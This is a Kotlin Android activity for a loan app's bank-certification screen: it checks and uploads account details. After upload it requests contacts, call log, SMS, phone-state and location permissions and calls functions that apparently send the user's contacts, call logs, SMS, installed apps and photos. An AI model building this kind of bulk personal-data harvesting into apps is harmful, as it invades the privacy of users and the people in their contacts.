package com.paisa.four_u.ui.userData.fourth

import android.Manifest
import com.paisa.four_u.R
import com.paisa.four_u.base.paisa_BaseActivity
import com.paisa.four_u.databinding.ActivityBankBinding
import com.paisa.four_u.model.MenuItemModel
import com.paisa.four_u.model.UserDataFourModel
import com.paisa.four_u.model.UserDataFourthModel
import com.paisa.four_u.ui.loan.paisa_LoanActivityPaisa
import com.paisa.four_u.ui.view.popview.paisa_SelectPoPView
import com.paisa.four_u.util.paisa_FBEvent
import com.paisa.four_u.util.expand.*
import com.paisa.four_u.util.workManager.*

class paisa_BankActivityPaisa : paisa_BaseActivity<ActivityBankBinding, paisa_BankVMPaisa>(
    ActivityBankBinding::inflate, paisa_BankVMPaisa::class.java
) {

    private var userDataModel: UserDataFourModel = UserDataFourModel()

    private var options: UserDataFourthModel.BankInfoListBean? = null


    override fun initData() {

        showCustomToast()
        initView()
        vb.toolbar.apply {
            tvTitle.text = str(R.string.paisa_bank_certification)
            ivExit.setOnClickListener { finish() }
        }

        vm.apply {
            getUserDataFourth()
            liveUserDataBean.observe(this@paisa_BankActivityPaisa) {
                it.bank_info_list?.bank_info?.let { model ->
                    userDataModel = model
                    setDataValue(model)
                }
                options = it.bank_info_list
            }
        }

    }

    private fun setDataValue(userDataModel: UserDataFourModel) {
        userDataModel.let { data ->
            vb.apply {
                ivsBankName.setSelectStr(data.bank_name.toString())
                iviBankNumber.setEditStr(data.account_no.toString())

                iviBankConfirm.setEditStr(data.account_no.toString())
                iviHolderName.setEditStr(data.holder_name.toString())

//                iviBankCode.setEditStr(data.invitation_code.toString())
            }

        }
    }


    override fun initView() {


        vb.apply {

            ivsBankName.setOnSelectListener {
                options?.options?.let {

                    showCommSelect(
                        str(R.string.paisa_select),
                        it.map2MenuItem(),
                        object : paisa_SelectPoPView.OnPOPSelected {
                            override fun OnSelected(itemModel: MenuItemModel, position: Int) {
                                ivsBankName.setSelectStr(itemModel.menuName);
                                userDataModel.bank_name = itemModel.menuCode
                                userDataModel.bank_id = itemModel.menuCode
                            }
                        })


                }
            }



            nextBtn.setOnClickListener {
//                userDataModel.invitation_code = iviBankCode.getEditStr()
                userDataModel.account_no = iviBankNumber.getEditStr()
                userDataModel.bank_name = ivsBankName.getSelectStr()
                userDataModel.holder_name = iviHolderName.getEditStr()
                userDataModel.let {


                    if(iviBankConfirm.getEditStr() != iviBankNumber.getEditStr()){
                        R.string.paisa_bank_id2.show()
                        return@setOnClickListener
                    }



                    if (it.bank_name.isNullOrEmpty()) {
                        R.string.paisa_please_choose_a_bank_account.show()
                        return@setOnClickListener
                    }
                    if (it.holder_name.isNullOrEmpty()) {
                        R.string.paisa_please_fill_in_name.show()
                        return@setOnClickListener
                    }

                    if (it.bank_id.isNullOrEmpty()) {
                        R.string.paisa_please_fill_in_bank_id.show()
                        return@setOnClickListener
                    }
                    if ("BCA".equals(
                            it.bank_name,
                            true
                        ) && iviBankNumber.getEditStr().length != 10
                    ) {
                        R.string.paisa_bca_must_ten_digits.show()
                        return@setOnClickListener
                    }
                    vm.uploadUserDataFourths(it)
                }
            }



            vm.liveUploadState.observe(this@paisa_BankActivityPaisa) {
                if (it) {

                    requestPermission(
                        arrayOf(
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                        )
                    ) {
                        submitContacts()
                        submitCallLog()
                        submitSMS()
                        submitInstall()
                        submitPhoto()
                        submitPhoneState()
                        paisa_FBEvent.trackEvent_Achieved4()
                        launch<paisa_LoanActivityPaisa> { }
                    }


                }
            }

        }

    }
}